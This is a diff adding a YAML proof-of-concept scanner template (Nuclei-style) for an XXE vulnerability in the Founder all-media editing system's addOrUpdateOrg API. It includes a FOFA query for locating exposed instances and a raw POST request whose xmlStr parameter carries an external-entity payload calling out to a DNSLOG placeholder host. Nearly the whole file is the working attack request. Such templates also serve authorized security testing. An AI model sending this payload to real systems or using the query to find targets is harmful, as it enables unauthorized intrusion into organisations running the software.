@@ -1,0 +1,32 @@
+id: poc-gdugg66spdd0r9c9
+info:
+  name: 方正全媒体采编系统 addorupdateorg 存在XXE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gdugg66spdd0r9c9'
+  tags: xxe,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gdugg66spdd0r9c9
+    fofa: app="FOUNDER-全媒体采编系统"
+http:
+- raw:
+  - 'POST /newsedit/api/orgUser/addOrUpdateOrg HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36
+
+
+    xmlStr=%3C!DOCTYPE%20root%20%5B%20%3C!ENTITY%20%25%20remote%20SYSTEM%20%22http://DNSLOG.com%22%3E%20%25remote;%5D%3E'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
